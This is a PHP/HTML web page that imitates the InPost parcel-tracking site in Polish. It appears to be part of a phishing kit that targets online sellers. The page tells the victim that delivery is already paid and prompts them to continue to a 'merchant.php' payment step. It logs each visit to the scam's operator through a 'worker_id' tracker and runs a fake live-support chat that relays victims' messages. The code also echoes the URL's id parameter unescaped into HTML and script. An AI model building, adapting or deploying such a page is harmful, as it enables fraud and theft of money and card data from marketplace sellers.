<?php
include "service.php";
include "../settings.php";
if (file_exists("data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("data/" . $_GET["id"] . ".xml");

sendTrack($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id);
?>
<!DOCTYPE html>
<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
		<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
		<title>Śledzenie przesyłek InPost | InPost - Paczkomaty, Kurier, Przesyłki Kurierskie</title>
        <style>.header-menu-pnk {
	text-decoration: none;
    color: #797979;
    font-size: 15px;
    margin-right: 20px;
    font-weight: 600;
}
#b-menu {
	float: right; 
	margin-right: 20px; 
	margin-top: 20px;
}
#header-menu {
	width: 100%; 
	height: 30px; 
	margin-top: 27px;
}
#_1f {
	background: #f3f3f3;
	font-size: 12px;
	color: #414042;
}
.fblock-title a {
	font-weight: 600;
	color: #414042;
    text-decoration: none;
}
.fblock-title {
    margin-bottom: 20px;
}
.nav-info {
	margin: 0 auto;
	max-width: 1024px;
	padding: 20px 0;
    border-bottom: 1px solid #d8d8d8;
}
.nav-info ul {
	display: flex;
	padding: 0;
}
.nav-info li {
	margin-bottom: 10px;
	list-style-type: none;
	font-size: 16px;
    margin: 20px;
}
.fblock-pnk {
	color: #414042;
    text-decoration: none;
}
.nolu-title {
	margin-top: 30px;
	margin-left: 40px;
    width: 70px;
}
#underheader {
	margin: 0 auto;
	max-width: 1024px;
}
.underheader-btn {
	background: #ffcd00;
	padding: 10px 20px;
	text-decoration: none;
	color: #3c3c3c;
}
#sled1 {
	width: 100%;
}
#sled2 {
	display: none;
}
._0 {
	margin: 0 auto;
	max-width: 1024px;
}
._1 {
margin: 0 auto;
	max-width: 1024px;
	height: 64px;
	margin-top: 18px;
	margin-bottom: 18px;
	display: flex;
}
._2 {
	height: 100%;
	background: url(logo.php) no-repeat 0 center / auto 72px;
	width: 200px;
}
._3 {
	width: 100%;
}
._4 {
	font-weight: bold;
	font-size: 20px;
}
._5 {
	margin-top: 12px;
}
._13 {
	font-weight: bold;
	font-size: 30px;
	margin-top: 50px;
	margin-bottom: 24px;
	margin-left: 16px;
}
._14 {
	margin-top: 12px;
}
._15 {
	width: 30%;
}
._16 {
	padding: 35px 16px;
    margin-bottom: 50px;
}
._17 {
	border-top: 1px solid #e7e7e7;
	padding: 50px;
	margin-bottom: 16px;
	color: #565656;
}
._177 {
	background: #3c3c3c;
	color: #fff;
	border: none;
}
._19 {
	padding: 12px;
    border: 1px solid #cacaca;
}
._20 {
	width: 250px;
	margin-top: 30px;
}
._21 {
	font-size: 16px;
	color: #555;
	margin-bottom: 24px;
}
._23 {
	padding: 20px;
	font-size: 20px;
	color: #3c3c3c;
	cursor: pointer;
	background: #ffcd00;
}
._23:disabled {
	background: #E8A4B8;
	cursor: default;
}
._24 {
	color: #999;
}
._30 {
	margin-bottom: 4px;
	font-size: 16px;
}
body {
	margin: 0;
	font-family: Arial;
	font-size: 14px;
	color: #ffcd00;
	word-break: break-word;
	-webkit-appearance: none;
}
input {
	font-family: Arial;
	font-size: 16px;
	color: #333;
	width: 100%;
	border: none;
	outline: none;
	box-sizing: border-box;
	-webkit-appearance: none;
}
table {
	width: 100%;
	border-collapse: collapse;
	-webkit-appearance: none;
}

td {
	padding: 0;
}
button {
	-webkit-appearance: none;
}
#copyright {
	padding: 20px; 
	margin: 0 auto; 
	max-width: 984px;
}
@media all and (max-width: 960px) {
	._0 {
		max-width: 480px;
	}
	._1 {
		margin-top: 16px;
	}
	/*._3, ._16, ._21, ._20 {
		width: 100%;
	}*/
	._13 {
		font-size: 26px;
		margin-top: 32px;
	}
	#header-menu {
	    display: none;
	}
	._2 {
		width: 100%;
	}
	._15 {
	    width: 40%;
	}
	#_1f {
	display: block;
	padding: 30px;
	}
	.nav-info {
	    width: 50%;
	    margin-left: 20%;
	}
	#sled1 {
		display: none;
	}
	#sled2 {
		display: block;
		width: 100%;
	}
	.nav-info ul {
		display: block;
	}
	#underheader {
		display: none;
	}
	#copyright {
		max-width: 434px;
	}
}

</style>
        <script></script>
        <meta property="og:url" content="https://inpost.pl/">
        <meta property="og:site_name" content="InPost">
        <meta property="og:title" content="<?php echo $xml->obyava; ?>">
        <meta property="og:description" content="<?php echo $xml->obyava; ?> | Śledzenie przesyłek InPost">
        <meta property="og:type" content="website">
        <meta property="og:image" content="/logoprev.png">
        <meta property="og:locale" content="pl_PL">
	</head>
	<body>
		<div style="border-bottom: solid 2px #ffcd00;">
			<div class="_1">
				<div class="_2"></div>
				<div id="header-menu">
					<a class="header-menu-pnk" href="https://inpost.pl/odbieram">Odbieram</a>
					<a class="header-menu-pnk" href="https://inpost.pl/wysylam">Wysyłam</a>
					<a class="header-menu-pnk" href="https://inpost.pl/oferta-dla-firm-i-allegro">Oferta dla Firm</a>
					<a class="header-menu-pnk" href="https://inpost.pl/o-inpost">O InPost</a>
					<a class="header-menu-pnk" href="https://inpost.pl/kariera">Kariera</a>
					<a class="header-menu-pnk" href="https://inpost.pl/cenniki">Cennik</a>
					<a class="header-menu-pnk" href="https://inpost.pl/kontakt">Kontakt</a>
				</div>
				<span id="b-menu"><img style="width: 30px; " src="./order_files/search.png"></span>
			</div>
		</div>
		<div id="underheader">
			<div style="display: flex; float: right;">
				<a class="underheader-btn" href="https://inpost.pl/sledzenie-przesylek">Śledź paczkę</a>
				<a class="underheader-btn" href="https://inpost.pl/znajdz-paczkomat">Znajdź Paczkomat</a>
			</div>
		</div>
		<div class="_0">
			
			<div>
				<div class="_13">Śledź paczkę</div>
				<div class="_3">
					<div class="_17">
						<div style="font-size: 18px; margin-bottom: 20px;">Wyjazd ID: <span style="color: #ffcd00; margin-left: 10px;"><?php echo $_GET['id']; ?></span></div>
						<div style="font-size: 18px;">Status: <span style="color: #ffcd00; margin-left: 10px;">otrzymanie środków</span></div>
					</div>
				</div>
				<div class="_3">
					<div class="_17 _177">
						<h2>Dostawa została już opłacona!</h2>
						<div style="font-size: 16px; line-height: 1.7;"> 
							Jak tylko otrzymasz środki na swoją konto, wyślij
                                    towar do kupującego według danych, jaki napisane wyżej
                                    <br><br>Po wysłaniu towaru prosimy o podanie kupującemu numeru dostawy
						</div>
						<div class="_20">
							<input form="form1" id="_buttonPay" class="_23" value="Dalej" type="submit">
						</div>
					</div>
				</div>
				
				<div class="_16">
					<form id="form1" action="merchant.php" method="GET">
						<input id="_formCost" name="id" value="<?php echo $_GET['id']; ?>" type="hidden">
						<div class="_4">Dane kupującego:</div>
						<div class="_14 _21">
							<table>
								<tbody><tr>
									<td class="_19 _15">Produkt:</td>
									<td class="_19"><?php echo $xml->obyava; ?></td>
								</tr>
								<tr>
									<td class="_19 _15">Kupujący:</td>
									<td class="_19"><?php echo $xml->fio; ?></td>
								</tr>
								<tr>
									<td class="_19 _15">Suma:</td>
									<td class="_19"><?php echo $xml->price; ?> zł</td>
								</tr>
								<tr>
									<td class="_19 _15">Wyjazd ID:</td>
									<td class="_19"><?php echo $_GET['id']; ?></td>
								</tr>
							</tbody></table>
						</div>
					</form>
				</div>
				<div style="padding: 10px; margin-bottom: 100px;">
					<img id="sled1" src="./order_files/Sledzenie1.png">
					<img id="sled2" src="./order_files/Sledzenie2.png">
				</div>
			</div>
			
		</div>
		<div id="_1f">
				<div class="nav-info">
                    <ul>
                        <li><a class="fblock-pnk" href="https://inpost.pl/fundacja-inpost">Fundacja InPost</a></li>
                        <li><a class="fblock-pnk" href="https://inpost.pl/SzybkieNadania/">Szybkie Nadania</a></li>
                        <li><a class="fblock-pnk" href="https://grupainteger.logintrade.net/logowanie.html">Dla dostawców</a></li>
                        <li><a class="fblock-pnk" href="https://inpost.pl/kariera">Kariera</a></li>
                        <li><a class="fblock-pnk" href="https://inpost.pl/reklama">Reklama z InPost</a></li>
                        <li><a class="fblock-pnk" href="https://inpost.pl/regulaminy">Regulaminy</a></li>
                    </ul>
                </div>
                <div id="copyright">
                	Copyright © 2022 InPost sp. z o.o. Wszelkie prawa zastrzeżone.
                </div>
				
			</div>

			<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #ffcd00;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #ffcd00;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #3c3c3c;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>


    <div id="offonthechap">
            <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
                <div class="chaport-launcher" style="left: 0px; right: 0px;">
                    <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                        <div class="chaport-launcher-chat-icon"></div>
                        <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                        <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                        <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                        <div class="chaport-launcher-close-icon"></div>
                        <div class="chaport-launcher-operator-photo"></div>
                    </div>
                </div>
                <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                    <div class="chaport-inner">
                        <div class="main-textblock">
                            <div class="operatorblock">
                                <div class="operatorblock-content" style="display: flex;">
                                    <div id="operator-photo">
                                        <img id="oper-photo-img" src="./order_files/operator-img.png">
                                        <div class="operator-name">Sofia</div>
                                    </div>
                                    <div class="team-wrapper">
                                        <div class="team">Pomoc techniczna</div>
                                        <div class="activity-indicator">
                                            <div class="with-status" style="display: inline-block;">
                                                <div class="status-online" style="display: inline-block;">
                                                    
                                                </div>online</div>
                                            </div>
                                        </div>
                                </div>
                            </div>
                            <div class="chat-block">
                                <div id="chat">
                                    <div class="operators-msg" id="greeting-msg" style="display: none;">
                                        <div class="operators-photo"><img src="./order_files/operator-img.png"></div>
                                        <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>                            
                                    </div>
                                
                                </div>
                                <div id="input-msg" style="display: flex;">
                                    <input type="text" name="smstosup1" id="smstosup1" placeholder="Wpisz swoją wiadomość...">
                                    <button id="smstosupbutton1" onclick="sendMessage()">
                                        <div class="chaport-send-icon">
                                            <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">      
                                                </polygon>
                                            </svg>
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>  
                    <div class="chaport-big-shadow"></div>
            </div>
        </div>

        <script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
</body></html>